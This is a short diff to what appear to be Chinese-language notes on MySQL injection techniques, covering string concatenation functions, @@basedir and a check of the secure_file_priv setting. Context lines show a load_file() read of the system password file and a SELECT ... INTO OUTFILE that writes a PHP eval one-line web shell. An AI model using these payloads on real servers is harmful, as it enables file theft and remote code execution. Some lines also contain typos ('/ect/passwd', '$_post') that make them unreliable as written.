@@ -448,9 +448,9 @@ concat()  //能将一些字符串连接一个字符串适用于一条数据
 
 group_concat() //能够将一张表的数据的一些数据分组合并起来，适用性比较广
 
-show @@basedir; //显示文件根目录
+select @@basedir; //显示文件根目录
 show variables like "%char%";
-
+show global variables like '%secure_file_priv%';
 select load_file('/ect/passwd'); //读文件 需要开secure-file-priv='/'
 
 select '<?php @eval($_post["mima"])?>' into outfile "位置" //写文件
